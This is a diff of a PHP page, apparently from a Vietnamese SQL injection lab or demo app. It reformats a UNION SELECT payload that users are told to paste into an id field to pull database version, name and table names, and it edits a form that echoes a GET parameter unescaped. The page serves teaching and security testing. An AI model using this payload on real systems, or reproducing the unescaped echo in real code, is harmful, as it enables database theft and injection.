@@ -98,10 +98,7 @@ Password: anything</code></pre>
                 <tr>
                     <td class="border px-4 py-2">4</td>
                     <td class="border px-4 py-2">Thử copy đoạn code sau vào form id:
-                        <code class="bg-gray-300">1
-                            and 1!=1
-                            UNION SELECT 'a',VERSION(),table_name,DATABASE(),'c',11,11,'d',NOW(),NOW() FROM information_schema.tables
-                            WHERE table_schema = database() LIMIT 1,1
+                        <code class="bg-gray-300">1 and 1!=1 UNION SELECT 11,11,11,DATABASE(),table_name,11,VERSION(),11,NOW(),NOW(),11 FROM information_schema.tables WHERE table_schema = database() LIMIT 1,1
                         </code>
                     </td>
                     <td class="border px-4 py-2">Thông tin cơ sở dữ liệu được tìm thấy bao gồm tên bảng làm tên bài đăng, phiên bản cơ sở dữ liệu làm ID người dùng và tên cơ sở dữ liệu làm nội dung bài đăng.</td>
@@ -112,8 +109,8 @@ Password: anything</code></pre>
     </div>
 </section>
 <section>
-    <form class="w-full" action="<?= url('/injection') ?>">
-        <span class="bg-gray-300 p-2 rounded-s-md"><?= getBaseUrl() ?>/post?id=</span>
+    <form method="get" class="w-full" action="<?= url('/test/injection') ?>">
+        <span class="bg-gray-300 p-2 rounded-s-md"><?= getBaseUrl() ?>/?id=</span>
         <input type="text" class="py-2 rounded-e-md " placeholder="nhập id bài viết" id="postId"
             name="url"
             value="<?= !empty($_GET['url']) ? $_GET['url'] : '' ?>" />
